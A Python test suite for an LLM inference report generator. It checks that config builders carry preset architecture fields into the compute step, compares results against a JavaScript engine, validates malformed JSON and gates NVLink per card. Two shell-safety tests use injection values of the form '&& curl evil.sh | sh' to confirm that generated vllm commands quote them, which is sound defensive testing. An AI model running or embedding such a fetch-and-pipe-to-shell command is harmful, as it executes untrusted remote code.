#!/usr/bin/env python3
"""Verify generate_report.py's cfg builders carry a preset's full architecture
into compute() — and that they do it by construction, not by naming fields.

parity.test.py extracts compute() with an AST trick that keeps reportlab out of
scope — but it cherry-picks a handful of top-level nodes and re-execs them with
only `math` in scope, so it cannot see from_json(), from_cli_args(), or
interactive_mode() at all. That blind spot is exactly how attn/swa_win/
swa_local/mla_dim, and separately max_ctx, went missing from every cfg
builder's key whitelist while compute() itself already handled them correctly:
nothing ever exercised the builders against PRESETS. This suite imports
generate_report as a real module instead, so it sees what the builders
actually return.

Checked:
  1. For every PRESETS entry, from_cli_args()/from_json()/interactive_mode()
     — including the actual computed numbers for interactive_mode, not just
     which keys arrive — must make compute() behave identically to
     arch_fields() applied to that preset directly. Not a hand-written second
     copy of what PRESETS should produce: that's itself a whitelist that
     silently stops covering a field the moment PRESETS gains one this file
     was never told about.
  2. Independently of arch_fields() entirely: Python's compute() must match
     index.html's computeInference(), driven by index.html's own MODEL_PRESETS
     table (extracted from source, not re-derived) — the JS engine as oracle.
  3. A field neither this file nor compute() has ever heard of still reaches
     cfg through every builder that starts from a preset, because those
     builders forward a preset's fields by default rather than by name.
  4. An explicit value in a JSON config wins over the preset it also selects,
     for architecture fields exactly as it already does for ctx/kv_bpp/etc —
     specifically checked in the vulnerable direction: a preset that defines
     NO swa/mla keys of its own, overridden into swa/mla, must still produce
     real non-zero KV — not attn flipped with the parameter that gives it
     meaning silently dropped, which is what "override restricted to keys
     the preset already defines" actually did.
  5. A wrong-typed value from raw JSON fails loudly and names the offending
     key, instead of crashing anonymously deep inside compute() (or worse,
     computing a confident wrong answer).
  6. hf_model/quant, both reachable from raw JSON, cannot inject shell syntax
     into the copy-pasteable vllm serve command.

Run:  python3 tests/report.test.py
"""
import contextlib
import io
import json
import math
import os
import subprocess
import sys
import tempfile
import types
import unittest.mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
import generate_report as gr

pass_ct = fail_ct = 0

def test(name, fn):
    global pass_ct, fail_ct
    try:
        fn()
        print(f"  ok   {name}")
        pass_ct += 1
    except Exception as e:
        # Broad on purpose: a dropped key can surface as KeyError rather than
        # AssertionError, and that must be reported, not crash the suite
        # before every preset gets a chance to run.
        print(f"  FAIL {name}\n       {type(e).__name__}: {e}")
        fail_ct += 1


def dict_diff(got, want):
    """Field-by-field diff between two compute() outputs, for failure messages."""
    lines = []
    for k in sorted(set(got) | set(want)):
        if got.get(k) != want.get(k):
            lines.append(f"{k}: builder={got.get(k)!r} expected={want.get(k)!r}")
    return lines


def assert_match(got, want, label):
    diff = dict_diff(got, want)
    assert not diff, f"{label} disagrees with the hand-built architecture:\n       " + "\n       ".join(diff)


def write_json(obj):
    fd, path = tempfile.mkstemp(suffix=".json")
    with os.fdopen(fd, "w") as f:
        json.dump(obj, f)
    return path


# ---- shared request parameters, held constant so only architecture varies ----
# ctx must clear every preset's swa_win (max is llama4-109b's 8192) — otherwise
# a SWA preset's local layers never actually hit their cap within this context,
# and standard vs. swa produce the same KV size by coincidence, masking exactly
# the bug this suite exists to catch.
REQ = {"gpu": "h100-80", "ctx": 16384, "conc": 4, "n_gpu": 1, "nvlink": True, "kv_bpp": 2}
BPP = 0.5  # awq, in both from_cli_args (via --prec) and from_json (via "bpp")


def expected_cfg(pd):
    """A cfg built from PRESETS' own translation (arch_fields) plus the fixed
    request parameters above — deliberately NOT a hand-written second copy of
    the field list. A hand-written 'expected' dict is itself a parallel
    whitelist: it silently stops covering a field the moment one is added to
    PRESETS but not mirrored here, which is the exact failure mode this suite
    exists to catch, just moved into the test instead of the product. The
    JS-oracle check below provides independent ground truth that doesn't go
    through arch_fields() at all, so this isn't circular — it verifies the
    builders route through arch_fields() and merge the request fields without
    dropping or clobbering anything, which a hand-copied dict can't tell you
    once arch_fields() is the single source of truth for both sides.
    """
    cfg = gr.arch_fields(pd)
    cfg.update({
        "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"], "n_gpu": REQ["n_gpu"],
        "gpu": gr.GPUS[REQ["gpu"]], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    return cfg


def cli_args_for(preset_key):
    return types.SimpleNamespace(
        preset=preset_key, gpu=REQ["gpu"], prec="awq", ctx=REQ["ctx"],
        conc=REQ["conc"], ngpu=REQ["n_gpu"], no_nvlink=not REQ["nvlink"],
        fp8_kv=REQ["kv_bpp"] == 1,
    )


def run_interactive_with_preset(preset_key):
    """Drive interactive_mode() end to end via mocked stdin, selecting
    preset_key and the shared request parameters. Exercises the real function
    — the no-args default path a first-time user hits — not a stand-in for
    it. n_gpu=1 below means nvlink's value never reaches compute() (it only
    affects multi-GPU overhead/penalty), so answering it "1" here doesn't
    diverge from REQ["nvlink"]=True used everywhere else."""
    preset_idx = list(gr.PRESETS.keys()).index(preset_key) + 1
    gpu_idx = list(gr.GPUS.keys()).index(REQ["gpu"]) + 1
    answers = [
        str(preset_idx),   # "Select preset number (or 'custom')"
        str(gpu_idx),      # "Select GPU number"
        "1",                # "GPU count [1]" — 1 GPU, so the NVLink prompt is never asked
        "3",                # "Select [3]" precision -> INT4/AWQ
        "n",                # "FP8 KV cache? [y/n, default n]"
        str(REQ["ctx"]),   # "Context length [8192]"
        str(REQ["conc"]),  # "Concurrent requests [1]"
    ]
    with unittest.mock.patch("builtins.input", side_effect=answers), \
         contextlib.redirect_stdout(io.StringIO()):
        return gr.interactive_mode()


print("\nPreset architecture reaches compute() (from_cli_args / from_json / interactive_mode vs. arch_fields)")
for key, pd in gr.PRESETS.items():
    want = gr.compute(expected_cfg(pd))

    def check_cli(key=key, want=want):
        got = gr.compute(gr.from_cli_args(cli_args_for(key)))
        assert_match(got, want, "from_cli_args")
    test(f"{key}: from_cli_args carries full architecture into compute()", check_cli)

    def check_json(key=key, want=want):
        path = write_json({
            "preset": key, "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"],
            "conc": REQ["conc"], "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"],
            "kv_bpp": REQ["kv_bpp"],
        })
        try:
            got = gr.compute(gr.from_json(path))
        finally:
            os.remove(path)
        assert_match(got, want, "from_json")
    test(f"{key}: from_json carries full architecture into compute()", check_json)

    def check_interactive(key=key, want=want):
        # Numbers, not just key routing (routing alone is the separate
        # property test further down). A corrupted interactive_mode that,
        # say, silently halved h_dim would still route every key through
        # fine and only show up here, in what compute() does with the value.
        got = gr.compute(run_interactive_with_preset(key))
        assert_match(got, want, "interactive_mode")
    test(f"{key}: interactive_mode carries full architecture into compute()", check_interactive)


# ---- JS engine as oracle ---------------------------------------------------
# Runs index.html's OWN MODEL_PRESETS table (not Python's PRESETS, not
# arch_fields — an entirely separate extraction) through its OWN
# computeInference(), the same way applyPreset() + buildState() would for a
# user selecting that preset in the browser. This is independent ground
# truth: it cannot be fooled by a bug in arch_fields() itself, only by the two
# engines genuinely disagreeing.
JS_ORACLE_RUNNER = r"""
const fs=require('fs');
const html=fs.readFileSync(process.argv[1],'utf8');
const gib=html.match(/^const GIB = .+;$/m)[0];
const perf=html.match(/^const PERF = \{[\s\S]*?\n\};$/m)[0];
const mp=html.match(/^const MODEL_PRESETS = \{[\s\S]*?\n\};$/m)[0];
/* computeInference() derives the TP/DP split it returns through
   parallelismFor()/splitParallelism(); they come into scope with it the same
   way GIB, PERF and MODEL_PRESETS do. Adjacent in the source, so one slice. */
const spS=html.indexOf('function splitParallelism('), spE=html.indexOf('function renderStrategyBadges');
if(spS===-1||spE===-1) throw new Error('splitParallelism()/parallelismFor() not found in index.html');
const split=html.slice(spS,spE);
const s=html.indexOf('function computeInference(state) {'), e=html.indexOf('\n}\n',s);
const scope=new Function(`${gib}\n${perf}\n${mp}\n${split}\n${html.slice(s,e+2)}; return {computeInference, MODEL_PRESETS};`)();
const gt=html.match(/^const GPU_TABLE = \{[\s\S]*?\n\};$/m);
if(!gt) throw new Error('GPU_TABLE not found in index.html');
const GPU_TABLE=new Function(`${gt[0]}; return GPU_TABLE;`)();
/* Keyed by catalog slug. Keying by display name meant reproducing
   getGpuSpec()'s " GB" -> "GB" rewrite on both sides of this file, and the two
   copies did not agree: the JS here anchored on /$/ while the Python below did
   not. They match on all twelve current names and diverge on the first name
   with " GB" anywhere but the end — which is the shape a multi-GCD board's name
   takes. The failure would have been an opaque "cannot read properties of
   undefined", not a diff. */
const G={};
for(const [k,g] of Object.entries(GPU_TABLE)){
  G[k]={gb:g.gb,bw:g.bw,h:g.hyper,sp:g.spec,st:g.spot,tf:g.tflops,
        name:g.name.replace(/ GB$/,'GB')};
}
const req=JSON.parse(process.argv[2]);
const g=G[req.gpu];
if(!g) throw new Error('no GPU_TABLE row for slug '+req.gpu);
const out={};
for (const key of Object.keys(scope.MODEL_PRESETS)) {
  const p=scope.MODEL_PRESETS[key];
  out[key]=scope.computeInference({
    params:p.p, activePercent:p.a, bytesPerParam:req.bpp, layers:p.l,
    kvHeads:p.kv, headDim:p.hd, sharedExperts:p.se||0,
    contextLength:req.ctx, concurrency:req.conc, gpuCount:req.n_gpu,
    hasNVLink:req.nvlink, kvBytesPerValue:req.kv_bpp,
    gpuGB:g.gb, gpuBandwidth:g.bw, gpuTFLOPS:g.tf, gpuHyperCost:g.h,
    gpuSpecCost:g.sp, gpuSpotCost:g.st, gpuName:g.name,
    attnMode:p.attn||'standard', swaWindow:p.swaWin||0,
    swaLocalLayers:p.swaLocal||0, mlaLatentDim:p.mlaDim||0,
    modelMaxCtx:p.maxCtx||131072,
  });
}
console.log(JSON.stringify(out));
"""

# Same field mapping parity.test.py uses — duplicated rather than imported,
# consistent with every test file here being runnable and readable on its own.
JS_FIELDS = [
    ("weights_gb", "weightsGB", 0.01), ("kv_gb", "kvCacheGB", 0.01),
    ("act_gb", "activationsGB", 0.01), ("total_gb", "totalGB", 0.01),
    ("per_total", "perGPU.total", 0.01), ("free_kv", "freeForKVCache", 0.01),
    ("max_ctx_1", "maxContextSingleUser", 1), ("max_conc_8k", "maxConcurrentAt8K", 1),
    ("single_tok", "singleStreamTokS", 1), ("agg_tok", "aggregateTokS", 1),
    ("agg_obs_lo", "aggregateObservedLoTokS", 1), ("agg_obs_hi", "aggregateObservedHiTokS", 1),
    ("per_user_load", "perUserAtLoadTokS", 1), ("eff_batch", "effectiveBatch", 0),
    ("max_batch_kv", "maxBatchByKV", 0), ("ttft_ms", "ttftMs", 1),
    ("sat_batch", "saturatedBatch", 0), ("sat_tok", "saturatedTokS", 1),
    ("kv_saved_by_prefix_gb", "kvSavedByPrefixGB", 0.01),
]
js_dig = lambda d, p: d["perGPU"]["total"] if p == "perGPU.total" else d[p]

print("\nJS engine as oracle (index.html's own MODEL_PRESETS + computeInference)")
req_for_js = dict(REQ, bpp=BPP)
proc = subprocess.run(
    ["node", "-e", JS_ORACLE_RUNNER, os.path.join(ROOT, "index.html"), json.dumps(req_for_js)],
    capture_output=True, text=True)
js_oracle = {}
if proc.returncode:
    print("  FAIL node runner failed:\n       " + proc.stderr.replace("\n", "\n       "))
    fail_ct += 1
else:
    js_oracle = json.loads(proc.stdout)

for key in gr.PRESETS:
    def check_js_oracle(key=key):
        js = js_oracle[key]
        py = gr.compute(gr.from_cli_args(cli_args_for(key)))
        bad = []
        for pk, jk, tol in JS_FIELDS:
            a, b = py[pk], js_dig(js, jk)
            if abs(a - b) > max(tol, abs(b) * 0.001):
                bad.append(f"{pk}: py={a:.6g} js={b:.6g}")
        assert not bad, "compute() vs. index.html's computeInference():\n       " + "\n       ".join(bad)
    test(f"{key}: matches the JS engine driven by index.html's own MODEL_PRESETS", check_js_oracle)


print("\nfrom_json raw (non-preset) branch")

def check_raw_defaults_to_standard():
    # An existing JSON config with no attention keys at all must keep behaving
    # exactly as it did before this fix: standard attention.
    path = write_json({
        "params": 8, "layers": 32, "kv_heads": 8, "h_dim": 128,
        "ctx": 8192, "conc": 4, "n_gpu": 1, "gpu": "h100-80",
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("attn", "standard") == "standard", f"attn defaulted to {cfg.get('attn')!r}"
    assert cfg.get("swa_win", 0) == 0 and cfg.get("swa_local", 0) == 0 and cfg.get("mla_dim", 0) == 0
    explicit_standard = dict(cfg, attn="standard", swa_win=0, swa_local=0, mla_dim=0)
    assert_match(gr.compute(cfg), gr.compute(explicit_standard), "raw cfg vs. explicit-standard cfg")

test("a raw JSON config with no attention keys still gets standard attention", check_raw_defaults_to_standard)


def check_raw_swa_override_is_honored():
    path = write_json({
        "params": 26, "layers": 30, "kv_heads": 8, "h_dim": 256,
        "attn": "swa", "swa_win": 1024, "swa_local": 25,
        "ctx": 32768, "conc": 8, "n_gpu": 1, "gpu": "h100-80",
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("attn") == "swa" and cfg.get("swa_win") == 1024 and cfg.get("swa_local") == 25, \
        f"attention keys not carried through from raw JSON: {cfg}"
    swa_kv = gr.compute(cfg)["kv_gb"]
    standard_kv = gr.compute(dict(cfg, attn="standard"))["kv_gb"]
    # SWA caps most layers' KV at the window; at this context it must cost
    # strictly less than paying full standard attention for all 30 layers.
    assert swa_kv < standard_kv, f"swa_kv={swa_kv} standard_kv={standard_kv} — SWA had no effect"

test("a raw JSON config's explicit swa attention keys are carried into compute()",
     check_raw_swa_override_is_honored)


def check_raw_mla_override_is_honored():
    path = write_json({
        "params": 671, "layers": 61, "kv_heads": 128, "h_dim": 56, "shared_exp": 1,
        "attn": "mla", "mla_dim": 576,
        "ctx": 16384, "conc": 8, "n_gpu": 8, "gpu": "h100-80",
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("attn") == "mla" and cfg.get("mla_dim") == 576, \
        f"attention keys not carried through from raw JSON: {cfg}"
    mla_kv = gr.compute(cfg)["kv_gb"]
    standard_kv = gr.compute(dict(cfg, attn="standard"))["kv_gb"]
    assert mla_kv < standard_kv, f"mla_kv={mla_kv} standard_kv={standard_kv} — MLA had no effect"

test("a raw JSON config's explicit mla attention keys are carried into compute()",
     check_raw_mla_override_is_honored)


print("\nfrom_json: explicit JSON values override the selected preset's")

def check_preset_branch_raw_override_wins():
    # A JSON that selects a preset but also sets one of its architecture
    # fields explicitly must honor the explicit value — the same rule ctx and
    # kv_bpp already follow in this same branch. gemma4-31b is swa; forcing
    # attn back to standard makes the divergence impossible to paper over
    # with a coincidental match.
    path = write_json({
        "preset": "gemma4-31b", "attn": "standard", "gpu": REQ["gpu"],
        "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"], "n_gpu": REQ["n_gpu"],
        "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["attn"] == "standard", f"explicit JSON override lost to the preset: attn={cfg['attn']!r}"
    # Everything the JSON didn't override still comes from the preset.
    assert cfg["layers"] == gr.PRESETS["gemma4-31b"]["l"]
    assert cfg["max_ctx"] == gr.PRESETS["gemma4-31b"]["max_ctx"]

test("from_json: an explicit attn in the JSON overrides the selected preset's",
     check_preset_branch_raw_override_wins)


def check_preset_branch_honors_hf_model_override():
    # This tool's origin story is an air-gapped deployment: "pick a preset,
    # point it at my local weights" is the obvious thing to write in a
    # config. hf_model/model_name are set unconditionally by the request
    # layer below the override merge, so it's not enough for them to survive
    # the merge — they must actually win over the preset's own value there.
    path = write_json({
        "preset": "llama31-8b", "hf_model": "/opt/models/my-local-copy",
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["hf_model"] == "/opt/models/my-local-copy", \
        f"hf_model override lost to the preset: {cfg['hf_model']!r}"
    cmd = gr.build_vllm_cmd(cfg, gr.compute(cfg))
    assert "vllm serve /opt/models/my-local-copy \\" in cmd, \
        f"the emitted command still points at the network model id, not the local path:\n{cmd}"

test("from_json: an explicit hf_model in the JSON overrides the selected preset's",
     check_preset_branch_honors_hf_model_override)


def check_preset_branch_honors_model_name_override():
    path = write_json({
        "preset": "llama31-8b", "model_name": "My Local 8B",
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["model_name"] == "My Local 8B", \
        f"model_name override lost to the preset: {cfg['model_name']!r}"

test("from_json: an explicit model_name in the JSON overrides the selected preset's",
     check_preset_branch_honors_model_name_override)


def check_standard_preset_overridden_to_swa_gets_real_kv():
    # The vulnerable direction: llama31-8b defines no SWA keys at all, so
    # arch_fields(pd) never puts swa_win/swa_local in cfg to begin with. An
    # override merge restricted to "keys the preset already defines" — the
    # previous, broken version of this — let attn flip to swa while silently
    # dropping the window and local-layer count. That is not "override
    # ignored", it is "override half-applied": every local layer's KV comes
    # out empty instead of the requested number.
    path = write_json({
        "preset": "llama31-8b", "attn": "swa", "swa_win": 4096, "swa_local": 16,
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("swa_win") == 4096 and cfg.get("swa_local") == 16, \
        f"swa_win/swa_local dropped by the override merge: {cfg}"
    kv_gb = gr.compute(cfg)["kv_gb"]
    standard_kv = gr.compute(dict(cfg, attn="standard"))["kv_gb"]
    assert kv_gb > 0, f"kv_gb={kv_gb} — swa_win/swa_local were dropped, so every local layer's KV is empty"
    assert kv_gb < standard_kv, f"swa_kv={kv_gb} standard_kv={standard_kv} — SWA had no effect"

test("from_json: llama31-8b (defines no swa keys) overridden to swa gets a real, non-zero KV cache",
     check_standard_preset_overridden_to_swa_gets_real_kv)


def check_standard_preset_overridden_to_mla_gets_real_kv():
    # Same vulnerability, mla direction — this is the exact N1 regression:
    # attn flipped to mla while mla_dim silently stayed absent, computing a
    # confident kv_gb of 0.0 and fits=True instead of the requested number.
    path = write_json({
        "preset": "llama31-8b", "attn": "mla", "mla_dim": 576,
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("mla_dim") == 576, f"mla_dim dropped by the override merge: {cfg}"
    kv_gb = gr.compute(cfg)["kv_gb"]
    assert kv_gb > 0, f"kv_gb={kv_gb} — mla_dim was dropped, exactly the N1 regression"

test("from_json: llama31-8b (defines no mla keys) overridden to mla gets a real, non-zero KV cache",
     check_standard_preset_overridden_to_mla_gets_real_kv)


def check_preset_branch_honors_runtime_overrides():
    # shared_prefix/prefix_caching are never defined by any preset, so the
    # old "only keys the preset defines" filter dropped them here while the
    # raw (non-preset) branch already honoured them via dict(raw) — the same
    # inconsistency as the attn override, for a different field class.
    path = write_json({
        "preset": "llama31-8b", "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"],
        "conc": REQ["conc"], "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"],
        "kv_bpp": REQ["kv_bpp"], "shared_prefix": 4096, "prefix_caching": True,
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("shared_prefix") == 4096, f"shared_prefix dropped by the preset path: {cfg}"
    assert cfg.get("prefix_caching") is True, f"prefix_caching dropped by the preset path: {cfg}"

test("from_json: shared_prefix/prefix_caching reach cfg through the preset path too",
     check_preset_branch_honors_runtime_overrides)


print("\nMalformed raw JSON fails loudly and names the offending key")

def assert_raises_naming(fn, exc_type, needle):
    """Call fn() and require it to raise exc_type with needle in the message
    — proves a bad value fails loudly and names the key, instead of crashing
    anonymously deep inside compute() or, worse, silently computing zero."""
    try:
        result = fn()
    except exc_type as e:
        assert needle in str(e), f"{exc_type.__name__} raised but doesn't mention {needle!r}: {e}"
        return
    raise AssertionError(f"expected {exc_type.__name__} mentioning {needle!r}, got a normal return: {result!r}")


def check_bad_max_ctx_type_fails_clearly():
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "max_ctx": "lots", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "max_ctx")
    finally:
        os.remove(path)

test("a non-numeric max_ctx in raw JSON raises a clear, key-named error",
     check_bad_max_ctx_type_fails_clearly)


def check_bad_swa_local_type_fails_clearly():
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "attn": "swa",
                        "swa_local": "many", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "swa_local")
    finally:
        os.remove(path)

test("a non-numeric swa_local in raw JSON raises a clear, key-named error",
     check_bad_swa_local_type_fails_clearly)


def check_bad_preset_override_type_fails_clearly():
    # Same validation applies to the preset-branch override merge, not just
    # the raw (non-preset) branch.
    path = write_json({"preset": "llama31-8b", "attn": "mla", "mla_dim": "bad", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "mla_dim")
    finally:
        os.remove(path)

test("a non-numeric architecture override on a preset-selecting JSON raises a clear, key-named error",
     check_bad_preset_override_type_fails_clearly)


def check_prefix_caching_accepts_bool_and_0_1():
    # JSON authors routinely write 1/0 for booleans. isinstance(1, bool) is
    # False, so a naive isinstance() check rejects the reasonable input.
    for val in (0, 1, False, True):
        path = write_json({"params": 8, "layers": 32, "kv_heads": 8,
                            "prefix_caching": val, "gpu": "h100-80"})
        try:
            cfg = gr.from_json(path)  # must not raise
        finally:
            os.remove(path)
        assert cfg.get("prefix_caching") == val, f"prefix_caching={val!r} was not preserved: {cfg}"

test("prefix_caching accepts 0/1 as well as true/false", check_prefix_caching_accepts_bool_and_0_1)


def check_nonsensical_prefix_caching_value_still_rejected():
    # Widening to accept 0/1 must not widen all the way to "anything".
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8,
                        "prefix_caching": 2, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "prefix_caching")
    finally:
        os.remove(path)

test("a prefix_caching value that isn't 0/1/bool is still rejected",
     check_nonsensical_prefix_caching_value_still_rejected)


def check_bool_rejected_for_a_numeric_field():
    # isinstance(True, int) is True in Python — a stray boolean must not
    # silently pass as a valid layer count.
    path = write_json({"params": 8, "layers": True, "kv_heads": 8, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "layers")
    finally:
        os.remove(path)

test("a bool value for a numeric field like layers is rejected, not silently accepted as 1",
     check_bool_rejected_for_a_numeric_field)


def check_mla_without_mla_dim_is_rejected():
    # Nothing is being dropped here — the user under-specified — but the
    # symptom is identical to the N1 bug: attn='mla' with mla_dim absent
    # computes kv_gb=0.0 and fits=True instead of a real number.
    path = write_json({"preset": "llama31-8b", "attn": "mla", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "mla_dim")
    finally:
        os.remove(path)

test("attn='mla' without mla_dim is rejected instead of silently computing kv_gb=0",
     check_mla_without_mla_dim_is_rejected)


def check_swa_without_window_is_rejected():
    path = write_json({"preset": "llama31-8b", "attn": "swa", "swa_local": 16, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "swa_win")
    finally:
        os.remove(path)

test("attn='swa' without swa_win is rejected instead of silently computing kv_gb=0",
     check_swa_without_window_is_rejected)


def check_swa_without_local_layers_is_rejected():
    path = write_json({"preset": "llama31-8b", "attn": "swa", "swa_win": 4096, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "swa_local")
    finally:
        os.remove(path)

test("attn='swa' without swa_local is rejected instead of silently computing kv_gb=0",
     check_swa_without_local_layers_is_rejected)


print("\nvLLM command interpolation is shell-safe")

def check_quant_is_shell_quoted():
    # quant now reaches build_vllm_cmd() from raw JSON via the default-allow
    # override path — the same class of exposure hf_model already had, but
    # newly reachable for quant since the arch_fields rewrite.
    cfg = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]), gpu=gr.GPUS["h100-80"],
               n_gpu=1, ctx=8192, conc=1, bpp=0.5, quant="awq && curl evil.sh | sh")
    comp = gr.compute(cfg)
    assert comp["fits"], "test fixture doesn't fit — command would short-circuit before quant is even rendered"
    cmd = gr.build_vllm_cmd(cfg, comp)
    assert "--quantization 'awq && curl evil.sh | sh' \\" in cmd, f"quant was not shell-quoted:\n{cmd}"

test("a malicious quant value is shell-quoted in the generated command, not interpolated raw",
     check_quant_is_shell_quoted)


def check_hf_model_is_shell_quoted():
    cfg = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]), gpu=gr.GPUS["h100-80"],
               n_gpu=1, ctx=8192, conc=1, bpp=0.5, hf_model="foo && curl evil.sh | sh")
    comp = gr.compute(cfg)
    assert comp["fits"], "test fixture doesn't fit — command would short-circuit before hf_model is even rendered"
    cmd = gr.build_vllm_cmd(cfg, comp)
    assert "vllm serve 'foo && curl evil.sh | sh' \\" in cmd, f"hf_model was not shell-quoted:\n{cmd}"

test("a malicious hf_model value is shell-quoted in the generated command, not interpolated raw",
     check_hf_model_is_shell_quoted)


def check_ordinary_values_are_not_needlessly_quoted():
    # shlex.quote() must be invisible for the common case — no stray quotes
    # around a plain HuggingFace id or quant name that never needed escaping.
    cfg = gr.from_cli_args(cli_args_for("llama31-8b"))
    cmd = gr.build_vllm_cmd(cfg, gr.compute(cfg))
    assert "vllm serve meta-llama/Llama-3.1-8B-Instruct \\" in cmd, \
        f"an ordinary HF model id got quoted unnecessarily:\n{cmd}"
    assert "--quantization awq \\" in cmd, f"an ordinary quant value got quoted unnecessarily:\n{cmd}"

test("ordinary hf_model/quant values render unquoted, exactly as before",
     check_ordinary_values_are_not_needlessly_quoted)


print("\nDefault-allow property (a field neither compute() nor this file has heard of)")

def check_unrecognised_field_reaches_every_builder():
    # The exact scenario this round exists to prevent: a field added to
    # PRESETS that compute() doesn't read yet, or reads under a name nothing
    # in this file has been told about. If any builder still needs to be
    # taught this key's name before forwarding it, this fails — that is the
    # entire difference between default-allow and a whitelist with one more
    # entry in it.
    key = "llama31-8b"
    original = dict(gr.PRESETS[key])
    gr.PRESETS[key] = dict(original, attn_sink=4)
    try:
        cli_cfg = gr.from_cli_args(cli_args_for(key))
        assert cli_cfg.get("attn_sink") == 4, f"from_cli_args dropped attn_sink: {cli_cfg}"

        path = write_json({
            "preset": key, "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"],
            "conc": REQ["conc"], "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"],
            "kv_bpp": REQ["kv_bpp"],
        })
        try:
            json_cfg = gr.from_json(path)
        finally:
            os.remove(path)
        assert json_cfg.get("attn_sink") == 4, f"from_json dropped attn_sink: {json_cfg}"

        interactive_cfg = run_interactive_with_preset(key)
        assert interactive_cfg.get("attn_sink") == 4, f"interactive_mode dropped attn_sink: {interactive_cfg}"
    finally:
        gr.PRESETS[key] = original

test("a PRESETS field compute() has never heard of still reaches cfg through every builder",
     check_unrecognised_field_reaches_every_builder)


# ---- NVLink is a property of the card, not a default -----------------------
# Every builder here defaulted nvlink to True. Seven of the twelve catalogued
# cards have no NVLink at all, so a 2x RTX 4090 report claimed an interconnect
# that does not exist and took the 0.85 multi-GPU scaling that goes with it.
# The gate is the catalog's `form`, and index.html gates on the same field —
# parity.test.py compares the two answers card by card.
print("\nNVLink is gated on the card, in every builder")

NO_NVLINK_GPU = "rtx4090-24"   # consumer board, no NVLink
NVLINK_GPU = "a100-80"         # SXM board, has it

def check_cli_gates_nvlink():
    for key, gpu in gr.GPUS.items():
        args = cli_args_for("llama31-8b")
        args.gpu, args.ngpu, args.no_nvlink = key, 2, False
        cfg = gr.from_cli_args(args)
        want = gr.supports_nvlink(gpu)
        assert cfg["nvlink"] == want, (
            f"{key}: --no-nvlink absent gave nvlink={cfg['nvlink']!r}, "
            f"but form={gpu['form']!r} means {want}")

test("from_cli_args grants NVLink to exactly the cards that have it", check_cli_gates_nvlink)


def check_json_cannot_assert_nvlink():
    path = write_json({"preset": "llama31-8b", "gpu": NO_NVLINK_GPU, "n_gpu": 2, "nvlink": True})
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["nvlink"] is False, (
        f'a JSON config asking for NVLink on {NO_NVLINK_GPU} got {cfg["nvlink"]!r}')

test("from_json: an explicit nvlink:true on a card without NVLink is refused, not honoured",
     check_json_cannot_assert_nvlink)


def check_raw_json_cannot_assert_nvlink():
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8,
                       "gpu": NO_NVLINK_GPU, "n_gpu": 2, "nvlink": True})
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["nvlink"] is False, (
        f'the raw (non-preset) branch honoured nvlink:true on {NO_NVLINK_GPU}: {cfg["nvlink"]!r}')

test("from_json raw branch: nvlink:true on a card without NVLink is refused too",
     check_raw_json_cannot_assert_nvlink)


def run_interactive_on(gpu_key, n_gpu, nvlink_answer=None):
    """interactive_mode() against one card, with the NVLink prompt supplied only
    when the card is expected to be asked about it. If that expectation is
    wrong the mocked input runs out of answers (or consumes the wrong one) and
    the test fails — which is the point: the prompt should not appear for a
    board that cannot do it."""
